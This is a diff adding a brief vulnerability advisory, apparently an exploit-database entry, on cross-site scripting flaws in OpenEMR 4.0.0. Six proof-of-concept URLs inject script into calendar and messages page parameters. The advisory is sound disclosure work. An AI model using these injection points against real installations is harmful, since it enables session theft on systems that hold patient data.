@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/49090/info
+
+OpenEMR is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+OpenEMR 4.0.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/openemr/interface/main/calendar/index.php?tplview='<script>alert('XSS');</script>
+http://www.example.com/openemr/interface/main/calendar/index.php?pc_category='<script>alert('XSS');</script>
+http://www.example.com/openemr/interface/main/calendar/index.php?pc_topic='<script>alert('XSS');</script>
+http://www.example.com/openemr/interface/main/messages/messages.php?sortby="<script>alert('XSS');</script>
+http://www.example.com/openemr/interface/main/messages/messages.php?sortorder="<script>alert('XSS');</script>
+http://www.example.com/openemr/interface/main/messages/messages.php?showall=no&sortby=users%2elname&sortorder=asc&begin=724286<"> 
